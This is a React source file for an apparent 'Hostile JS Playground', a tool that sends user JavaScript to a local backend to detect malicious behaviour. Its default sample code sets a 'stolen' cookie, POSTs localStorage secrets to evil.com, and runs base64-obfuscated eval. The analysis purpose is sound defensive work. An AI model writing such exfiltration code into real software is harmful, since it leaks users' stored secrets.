import { useState, useEffect } from "react";
import CodeEditor from "./components/CodeEditor";
import Dashboard from "./components/Dashboard";
import Header from "./components/Header";
import Challenges from "./components/Challenges";
import Documentation from "./components/Documentation";
import AboutUs from "./components/AboutUs";
import "./theme.css";
import "./design-enhancements.css";

function App() {
  const [currentPage, setCurrentPage] = useState("playground");
  const [theme, setTheme] = useState("dark");
  const [code, setCode] = useState(`// Welcome to Hostile JS Playground!
// Write JavaScript code to analyze its behavior

// Example: Try this suspicious code
document.cookie = "stolen=data";
fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify({data: localStorage.getItem("secret")})
});

// Or try some obfuscated code
eval(atob("Y29uc29sZS5sb2coIkhpZGRlbiBtZXNzYWdlISIp"));`);

  const [executionResult, setExecutionResult] = useState(null);
  const [isExecuting, setIsExecuting] = useState(false);

  // Handle hash-based routing
  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash.slice(1); // Remove #
      if (
        hash === "challenges" ||
        hash === "docs" ||
        hash === "playground" ||
        hash === "about"
      ) {
        setCurrentPage(hash);
      }
    };

    // Set initial page based on hash
    handleHashChange();

    // Listen for hash changes
    window.addEventListener("hashchange", handleHashChange);

    return () => window.removeEventListener("hashchange", handleHashChange);
  }, []);

  // Theme toggle function
  const toggleTheme = () => {
    setTheme(theme === "dark" ? "light" : "dark");
    // In a real app, you would apply the theme change to the document
    document.documentElement.classList.toggle("light-theme");
  };

  const handleExecute = async () => {
    setIsExecuting(true);
    try {
      // Call the backend API
      const response = await fetch(
        "http://localhost:3002/api/analysis/execute",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ code }),
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();

      if (!data.success) {
        throw new Error(data.error || "Analysis failed");
      }

      setExecutionResult(data.result);
      setIsExecuting(false);
    } catch (error) {
      console.error("Execution failed:", error);
      setIsExecuting(false);

      // Show error to user
      setExecutionResult({
        id: Date.now().toString(),
        code,
        timestamp: new Date(),
        behaviors: [
          {
            type: "dynamic_evaluation",
            severity: "critical",
            description: `Analysis failed: ${error.message}`,
            details: { error: error.message },
            timestamp: new Date(),
          },
        ],
        riskScore: 0,
        executionTime: 0,
        logs: [
          {
            level: "error",
            message: `Analysis failed: ${error.message}`,
            timestamp: new Date(),
          },
        ],
      });
    }
  };

  // Fallback to mock data if needed
  const handleExecuteMock = async () => {
    setIsExecuting(true);
    try {
      const mockResult = {
        id: Date.now().toString(),
        code,
        timestamp: new Date(),
        behaviors: [
          {
            type: "network_request",
            description: "Attempted to send data to external domain",
            severity: "critical",
            details: {
              url: "https://evil.com/steal",
              method: "POST",
              data: "User localStorage data",
            },
          },
          {
            type: "cookie_access",
            description: "Modified document cookies",
            severity: "high",
            details: {
              action: "set",
              key: "stolen",
              value: "data",
            },
          },
          {
            type: "dynamic_evaluation",
            description: "Used eval() with base64 encoded content",
            severity: "medium",
            details: {
              method: "eval",
              content: 'console.log("Hidden message!")',
            },
          },
        ],
        riskScore: 85,
        executionTime: 1250,
        logs: [
          {
            level: "info",
            message: "Code execution started",
            timestamp: new Date(),
          },
          {
            level: "warning",
            message: "Suspicious network activity detected",
            timestamp: new Date(),
          },
          {
            level: "error",
            message: "Potential data exfiltration attempt",
            timestamp: new Date(),
          },
        ],
      };

      setTimeout(() => {
        setExecutionResult(mockResult);
        setIsExecuting(false);
      }, 2000);
    } catch (error) {
      console.error("Execution failed:", error);
      setIsExecuting(false);
    }
  };

  return (
    <div
      className={`min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 ${
        theme === "light" ? "light-theme" : ""
      }`}
    >
      <Header onThemeChange={toggleTheme} onNavigate={setCurrentPage} />

      <main className="container mx-auto px-4 py-6">
        {currentPage === "playground" && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Code Editor Panel */}
            <div className="flex flex-col">
              <CodeEditor
                code={code}
                onChange={setCode}
                onExecute={handleExecute}
                isExecuting={isExecuting}
              />
            </div>

            {/* Dashboard Panel */}
            <div className="flex flex-col">
              <Dashboard result={executionResult} isLoading={isExecuting} />
            </div>
          </div>
        )}

        {currentPage === "challenges" && <Challenges />}
        {currentPage === "docs" && <Documentation />}
        {currentPage === "about" && <AboutUs />}
      </main>
    </div>
  );
}

export default App;
